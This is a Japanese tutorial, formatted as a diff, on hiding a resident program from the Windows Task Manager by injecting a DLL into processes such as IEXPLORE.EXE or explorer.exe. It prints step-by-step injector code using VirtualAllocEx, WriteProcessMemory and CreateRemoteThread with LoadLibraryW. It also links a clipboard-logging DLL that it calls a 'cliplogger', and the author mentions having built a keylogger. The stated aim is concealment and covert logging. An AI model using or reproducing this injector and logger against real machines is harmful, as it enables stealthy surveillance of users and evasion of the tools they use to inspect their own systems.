@@ -1,0 +1,291 @@
+
+
+常駐プログラム隠蔽テクニック　～Windows篇～
+
+
+■0x01.) はじめに
+
+　タスクマネージャーに任意のプログラムを列挙されないようにする方法はないだろうか？　Windowsにはプロセスという概念がありアプリケーションはそれぞれプロセス単位で動作しています。プロセスは「Ctr+Alt+Del」で起動されるタスクマネージャーで確認でき、これを見ると現時点で起動しているプロセスのすべてを監視することができます。
+
+　さて、Windows上で実行されているアプリケーションはすべてＯＳの管理下に置かれているわけであり、よってすべてのプロセスをＯＳは管理していることになります。つまりは「常駐させたいプログラムをタスクマネージャーから消し去ることは難しいのでは？」と思われるかもしれません。ということで、今回は常駐プログラム隠蔽テクニックと題してお送りしたいと思います。
+
+　私が使用したＯＳはWindowsXP、コンパイラはVC++.NETです。前提となる知識は、Win32API、ＤＬＬの仕組み、それにプロセスやスレッドといったWindowsの基本的概念を理解していることです。
+
+
+■0x02.) プロセスとＤＬＬ
+
+　では最初に、タスクマネージャーに実行したプログラムがプロセスとして列挙されるところを観察してみます。test.cppをコンパイルし、タスクマネージャーを起動した後、以下のプログラムを実行してみてください。
+
+-----　test.cpp
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <tchar.h>
+
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPTSTR    lpCmdLine,
+                     int       nCmdShow)
+{
+    MessageBox(NULL, _TEXT("I am EXE file."), _TEXT("message"), MB_OK);
+    return 0;
+}
+-----
+
+　このプログラムが実行された直後にタスクマネージャーにtest.exeというプロセスが出現します。このプログラムはご覧のとおりＯＫボタンを押すと終了するので、押さないままでいると、ずっとタスクマネージャーにプロセスとして存在することになります。もちろんＯＫボタンを押すとプログラムは終了しますので、プロセスもタスクマネージャーから消えます。
+
+　さて、アプリケーションはプロセス単位で管理されていてプログラムが実行されればプロセスとしてタスクマネージャーに列挙されるということになります。「ではＤＬＬの扱いはどうなるのか？」次のプログラムをみてください。
+
+-----　dlltest.cpp
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <tchar.h>
+
+DWORD WINAPI MainThread(LPVOID pData);
+
+BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{
+    HANDLE hThread;
+
+    switch(ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        
+        if((hThread = CreateThread(NULL, 0, MainThread, (LPVOID)NULL, 0, NULL)) == NULL){
+            MessageBox(NULL, _TEXT("CreateThread"), _TEXT("Error"), MB_OK);
+            return FALSE;
+        }
+        CloseHandle(hThread);
+        break;
+    }
+
+    return TRUE;
+}
+
+
+
+DWORD WINAPI MainThread(LPVOID pData)
+{
+    MessageBox(NULL, _TEXT("I am DLL file."), _TEXT("message"), MB_OK);
+    return 0;
+}
+-----
+
+　まずはこのようなＤＬＬを作成します。このＤＬＬは呼び出されたら新しいスレッドを生成し、そのスレッドはMessageBoxを表示して、終了するというシンプルなものです。では次にこのＤＬＬを明示的に呼び出すtest2.cppを作成します。
+
+-----　test2.cpp
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <tchar.h>
+
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPTSTR    lpCmdLine,
+                     int       nCmdShow)
+{
+    MessageBox(NULL, _TEXT("I am EXE file."), _TEXT("message"), MB_OK);
+    
+    HINSTANCE hinstDll = LoadLibrary("dlltest");
+    Sleep(10000);
+    FreeLibrary(hinstDll);
+    return 0;
+}
+-----
+
+　では、このプログラムをコンパイルしてexeファイルの生成を確認したら、dlltest.cppをコンパイルして作成されたdlltest.dllを、exeファイルと同じフォルダに移動させて実行させてください。もちろんタスクマネージャーも起動させてください。
+
+　最初の"I am EXE file."が表示されたときにはＤＬＬはまだ読み込まれていません。タスクマネージャーにはtest2.exeが列挙されています。ＯＫをクリックすると次はＤＬＬが読み込まれて"I am DLL file."が表示されます。ここでＯＫを押さずに、タスクマネージャーを見てみても、プロセスの列挙に変化はありません。つまり新たにプロセスが生成されたわけではないということです。
+
+　これはＤＬＬの仕組みを理解しているならば当たり前のことですね。ＤＬＬはLoadLibraryを呼び出された時点で、呼び出し元のスレッドのプロセスにマッピングされるわけですから。つまりＤＬＬはプロセスにマッピングされた直後からそのプロセスの一部となるわけであり、そこで新たにCreateThreadが呼び出されたとしても、test2.exeのプロセス内で新たにスレッドが生成されただけだからです。よって、test2.exeが終了すればそのプロセスにマッピングされているＤＬＬ（dlltest.dll）もまた終了するのは当たり前であり、ＤＬＬがプロセスとして新たにタスクマネージャーに列挙されないのも当たり前のことです。
+
+
+■0x03.) 別のプロセスへのＤＬＬマッピング
+
+　ポイントは誰がLoadLibraryを呼んだのか？　というところにあります。ＤＬＬはLoadLibraryを呼び出したスレッドのプロセスにマッピングされるわけです。dlltest.dllの場合、LoadLibraryを呼び出したのはtest2.exeだったのでdlltest.dllはtest2.exeにマッピングされました。なのでそのプロセス（test2.exe）が終了したならばＤＬＬ（dlltest.dll）もまた終了するわけです。
+
+　では例えばLoadLibraryをIEXPLORE.EXE（ＩＥのプロセスです）が呼び出したらどうでしょうか。IEXPLORE.EXEが引数をdlltest.dllとしてLoadLibraryを呼び出したならば、もちろんdlltest.dllはIEXPLORE.EXEにマッピングされることになります。つまりtest2.exeが終了したとしてもＤＬＬは終了しません（当たり前ですね）。IEXPLORE.EXEにマッピングされたわけですので、IEXPLORE.EXEが終了するまでは終了しないわけです。しかし「そもそもIEXPLORE.EXEに、LoadLibraryを呼び出させることはできないじゃないか。ＤＬＬを呼び出すかどうかはexeファイル（IEXPLORE.EXE）の作成者が決めることであって、他人が決められることじゃないのでは？」と思われるかもしれませんが、それが可能なのです。Windowsには便利なAPIがたくさんあるのです(^^;。
+
+・CreateRemoteThread
+　http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_createremotethread.htm
+　別のプロセスのアドレス空間で稼働するスレッドを作成します。
+
+　説明のとおり別のプロセスのアドレス空間にスレッドを作成します。これを使えばIEXPLORE.EXEのアドレス空間にスレッドを作成できるわけです。例えばこんな風に。
+
+-----
+HANDLE hThread = CreateRemoteThread(RemoteProcess, NULL, 0,
+                                    LoadLibrary, "c:\\dlltest.dll", 0, NULL);
+-----
+
+　「めっちゃ簡単やーん」と思ってやってみると、できません（笑　おそらく問題は「IEXPLORE.EXEのアドレス空間に"c:\\dlltest.dll"という文字列がない」ということでしょう。まぁ、ないならば作ればよいわけです。
+
+・VirtualAllocEx
+　http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_virtualallocex.htm
+　指定されたプロセスの仮想アドレス空間内のメモリ領域の予約とコミットの一方または両方を行います。この関数は MEM_RESET フラグがセットされていない限り、確保されるメモリが自動的に 0 で初期化されます。
+
+・WriteProcessMemory
+　http://www.microsoft.com/japan/developer/library/jpwinpf/_win32_writeprocessmemory.htm
+　指定されたプロセスのメモリ領域にデータを書き込みます。書き込みたい領域全体がアクセス可能でなければなりません。さもないと、関数は失敗します。
+
+　VirtualAllocExでIEXPLORE.EXEのアドレス空間に新たにメモリ空間を作成します。そしてWriteProcessMemoryでそのメモリ空間に"c:\\dlltest.dll"を書き込めばよいわけです。そしてその文字列のアドレスをCreateRemoteThreadの第五引数に渡してやれば、IEXPLORE.EXEのアドレス空間内に文字列が作成されることになります。しかし、まだできません（ぉぃ。どうやら第四引数のLoadLibraryをそのまま渡すのはまずいらしいです。仕方がないのでKernel32.dllから検索してきてそのアドレスを渡してあげましょう。
+
+・GetModuleHandle（日本語版ＳＤＫがないみたいです）
+　http://nienie.com/~masapico/api_GetModuleHandle.html
+　現在呼び出し元プロセスにロードされているexeやdllのメモリ上の位置を示すアドレスを返す。従って、GetModuleHandleの返すハンドルはLoadLibrary関数で返されたハンドルと同様の扱いで、他のAPI関数に渡すことができる。
+
+・GetProcAddress
+　http://www.microsoft.com/japan/msdn/library/default.asp?url=/japan/msdn/library/ja/jpdllpro/html/_win32_getprocaddress.asp
+　ダイナミックリンクライブラリ（DLL）が持つ、指定されたエクスポート済み関数のアドレスを取得します。
+
+　GetModuleHandleでKernel32.dllのアドレスをもらい、それをGetProcAddressに渡してLoadLibraryのアドレスを取得します。しかし、実はLoadLibraryなんて関数は存在せず、UNICODEならLoadLibraryW、ASCIIコードならLoadLibraryAに変換されているだけであることが、WinBase.hをみることでわかります。よってどちらかのアドレスを取得することにします。
+
+-----　C:\Program Files\Microsoft Visual Studio .NET\Vc7\PlatformSDK\Include\WinBase.h
+#ifdef UNICODE
+#define LoadLibrary  LoadLibraryW
+#else
+#define LoadLibrary  LoadLibraryA
+#endif // !UNICODE
+-----
+
+　さて、これらの知識を踏まえた上でやるべきことをまとめます。目的は別のプロセス（ここではIEXPLORE.EXE）にＤＬＬを注入させることです。そのために必要なことはターゲットのプロセス（ここではIEXPLORE.EXE）にLoadLibraryを呼び出させることであり、それによってこちら側が用意したＤＬＬをターゲットのプロセスにマッピングさせることです。それにより常駐させるプログラムをあらかじめＤＬＬとして作っておけば、それをターゲットプロセスにマッピングさせることによりタスクマネージャーのプロセス空間に列挙されることなく任意のプログラム（ＤＬＬ）を注入させ、実行させようということです。
+
+
+■0x04.) プログラミング
+
+　以上のことをプログラムにしたのがin_dll.cppです。まずはプログラムの説明をします。
+
+http://kenjinet.s26.xrea.com/windows/process/in_dll.cpp
+
+-----
+#define WIN32_LEAN_AND_MEAN
+
+#define UNICODE
+#define _UNICODE
+
+#include <windows.h>
+#include <tlhelp32.h>
+#include <tchar.h>
+
+#define TARGET_EXE_NAME  "IEXPLORE.EXE"
+#define DLL_FILE_NAME    "ClipBoard.dll"
+-----
+
+　「なんでUNICODEやねん！」という突っ込み以外はとくに問題ないと思います(^^;　tlhelp32.hはプロセスの検索を行うために使う関数の定義なのですが、詳しくはのちほど説明します。TARGET_EXE_NAMEはＤＬＬを注入するプロセスの名前、DLL_FILE_NAMEは注入するＤＬＬのファイル名です。ＤＬＬはexeファイルと同じフォルダにいれなければなりません。
+
+-----
+    HANDLE hSnap;
+    if((hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE){
+        MessageBox(NULL, _TEXT("CreateToolhelp32Snapshot"), _TEXT("Error"), MB_OK);
+        return -1;
+    }
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+
+    DWORD dwProcessId = 0;
+    BOOL bResult = Process32First(hSnap, &pe);
+    while(bResult){
+        if(!lstrcmp(pe.szExeFile, _TEXT(TARGET_EXE_NAME))){
+            dwProcessId = pe.th32ProcessID;
+            break;
+        }
+        bResult = Process32Next(hSnap, &pe);
+    }
+    CloseHandle(hSnap);
+-----
+
+　さっそくプロセスの検索を行います。CreateToolhelp32Snapshotはプロセスの列挙をおこなうタスクマネージャー的なプログラムを作る際に利用されるプログラムで、たいていの場合Process32FirstやProcess32Nextとセットにして使い、PROCESSENTRY32構造体のpeにプロセスの情報が入ります。プロセス列挙に関するサンプル的なコードを書きましたので、よければ参考にしてください。
+
+http://kenjinet.s26.xrea.com/windows/process/process.cpp
+
+　ではin_dll.cppの説明を続けます。
+
+-----
+    HANDLE hProcess;
+    hProcess = OpenProcess(
+         PROCESS_QUERY_INFORMATION |
+         PROCESS_CREATE_THREAD     |
+         PROCESS_VM_OPERATION      |
+         PROCESS_VM_WRITE,
+         FALSE, dwProcessId);
+-----
+
+　これはプロセスを開く関数です（みればわかりますが）。プロセスＩＤを渡せばそのプロセスを開いてくれるので、さっきProcess32Nextなどを使って検索してきたTARGET_EXE_NAMEのプロセスＩＤ（つまりＤＬＬを注入するターゲットのプロセスＩＤ）を渡しています。戻り値はそのプロセスのハンドルです。
+
+-----
+    TCHAR szLibFile[256];
+    GetModuleFileName(NULL, szLibFile, sizeof(szLibFile));
+    _tcscpy(_tcsrchr(szLibFile, _TEXT('\\')) + 1, _TEXT(DLL_FILE_NAME));
+-----
+
+　ＤＬＬのパスを作成しています。まずGetModuleFileNameで自分自身（つまりexeファイル）の絶対パスを取得して、その文字列の後ろから探して最初に'\'が発見されたところから以後ＤＬＬファイルの名前に置き換えています。つまり自分と同じフォルダにあるＤＬＬの絶対パスを作成したわけです。
+
+-----
+    PWSTR RemoteProcessMemory;
+    RemoteProcessMemory = (PWSTR)VirtualAllocEx(
+        hProcess, NULL, szLibFileLen, MEM_COMMIT, PAGE_READWRITE);
+    if(RemoteProcessMemory == NULL){
+        MessageBox(NULL, _TEXT("VirtualAllocEx"), _TEXT("ERROR"), MB_OK);
+        return -1;
+    }
+
+    if(WriteProcessMemory(hProcess, RemoteProcessMemory,
+        (PVOID)szLibFile, szLibFileLen, NULL) == 0){
+            MessageBox(NULL, _TEXT("WriteProcessMemory"), _TEXT("ERROR"), MB_OK);
+            return -1;
+    }
+-----
+
+　まずVirtualAllocExでターゲットプロセスにメモリ空間を作成しています。これはＤＬＬの絶対パスを入れるメモリ空間です。そしてWriteProcessMemoryでＤＬＬの絶対パスを書き込んでいます。するとVirtualAllocExの戻り値がＤＬＬ絶対パスの位置（ポインタ）ということになるので、これをCreateRemoteThreadの引数として渡します。
+
+-----
+    PTHREAD_START_ROUTINE pfnThreadRtn;
+    pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(
+        GetModuleHandle(_TEXT("Kernel32")), "LoadLibraryW");
+    if (pfnThreadRtn == NULL){
+        MessageBox(NULL, _TEXT("GetProcAddress"), _TEXT("ERROR"), MB_OK);
+        return -1;
+    }
+-----
+
+　GetProcAddressはKernel32.dllからLoadLibraryW（UNICODE用）を探してきてそのアドレスを返しています。これはUNICODE用のソースコードですのでLoadLibraryWですが、ASCIIならLoadLibraryAを利用してください。Windows2000/XPはLoadLibraryAを使っても内部的にUNICODEに変換されて結局LoadLibraryWを呼んでいるようなので、UNICODEかASCIIかで特に気にする必要はないでしょう。
+
+-----
+    HANDLE hThread;
+    hThread = CreateRemoteThread(hProcess, NULL, 0, 
+        pfnThreadRtn, RemoteProcessMemory, 0, NULL);
+    if (hThread == NULL){
+        MessageBox(NULL, _TEXT("CreateRemoteThread"), _TEXT("ERROR"), MB_OK);
+        return -1;
+    }
+-----
+
+　ついにCreateRemoteThreadが呼ばれました。第一引数はOpenProcessの戻り値であるプロセスのハンドルです。第四引数はLoadLibraryWのアドレス。第五引数はＤＬＬ絶対パスのアドレス。これでCreateRemoteThreadを呼び出せばターゲットのプロセスでLoadLibraryWスレッドが生成され、見事任意のＤＬＬがターゲットプロセスにマッピングされることになります。
+
+　そして、このプログラム（in_dll.exe）は終了します。このプログラムにＤＬＬがマッピングされているならば、終了と同時にＤＬＬ自体も終了します。しかし別のプロセスにマッピングさせたならば自分自身が終了してもＤＬＬの処理は生き続けます。IEXPLORE.EXEならばＩＥが終了するまで生き続けますし、explorer.exeといったWindowsの動作に不可欠なプロセスなどにマッピングさせたならばWindowsの終了まで生き続けることになります。
+
+　タスクマネージャーはプロセスを列挙します。よってIEXPLORE.EXEやexplorer.exeといったプログラムは、もちろん列挙、表示されるでしょう。しかし、マッピングされたＤＬＬはプロセスとして列挙されません。これは当たり前のことですね。
+
+　ちなみにこの方法だと完全に隠蔽できるのか？　と聞かれれば「いいえ」と答えるしかありません。実際に任意のプロセスが利用しているＤＬＬを列挙させるプログラムなんかも作れますし、タスクマネジャー以上に高機能なプロセス管理ツールなどならすぐにバレてしまうかもしれません。あくまでもタスクマネージャーから見えなくするだけです。よって、これは常駐させたいプログラムを隠すひとつの方法だと考えてください。
+
+　では最後に常駐させたいプログラム（ＤＬＬ）を作成してみます。
+
+http://kenjinet.s26.xrea.com/windows/process/ClipBoard.cpp
+
+　これはクリップボードのログをとるＤＬＬです。キーボードのログをとるのツールをキーロガーと言いますが、これはクリップボードのログをとるのでクリップロガーですね（ぉぃ。これをコンパイルしてin_dll.exeと同じフォルダにいれてin_dll.exeを実行すると、このＤＬＬがターゲットのプロセスにマッピングされるので、以後クリップボードのログが"c:\log.txt"ファイルに保存されることになります。ちなみに文字列専用ですのでクリップボード内の画像やファイルなどはロギングしません。このＤＬＬに関しての解説はしません。これは今回の本質ではないので(^^;。
+
+
+■0x05.) さいごに
+
+　さて、いかがだったでしょうか。ＤＬＬ関連のテクニックは以外に役に立つんじゃないかなと思い書いてみました。実はつい最近、実用的なキーロガーを作りまして、今回のネタはその時に使ったソースコードを流用してます（笑。内容は前回よりさらに難しくなってますけど、それはネタが切れてきたということです。正直もうネタ切れです。次回はたぶんLinuxの記事になると思います(^^;。さて、最後になりましたがここまで付き合って読んでくださった方本当に有り難うございました。
+
+では、また会う日まで...
+
+
+■0x06.) 参考文献
+
+　「Advanced Windows」 Jeffrey Richter著
